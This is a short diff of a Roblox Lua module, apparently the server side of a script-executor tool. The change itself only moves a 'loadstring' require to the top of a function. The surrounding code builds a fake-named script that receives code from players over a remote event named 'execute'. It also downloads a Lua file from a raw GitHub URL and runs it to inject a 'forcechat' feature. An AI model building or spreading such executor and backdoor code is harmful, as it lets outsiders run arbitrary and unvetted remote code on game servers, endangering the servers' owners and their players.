@@ -2,6 +2,7 @@ local module = {}
 
 function module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
     local player = nil
+    local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
 
 	local function SELVO_fake_script()
 		local script = Instance.new('Script', exec)
@@ -10,8 +11,6 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
 		local remotes = {
 			execute = script.Parent:WaitForChild("execute", 99999);
 		}
-
-		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
 
 		remotes.execute.OnServerEvent:Connect(function(playere, code)
             player = playere
@@ -41,7 +40,6 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
                     print(player, playergui)
 
                     if not exec.Parent:FindFirstChild("forcechat") then
-                        local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))
                         local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()
 
 		                fcmain:init(player)
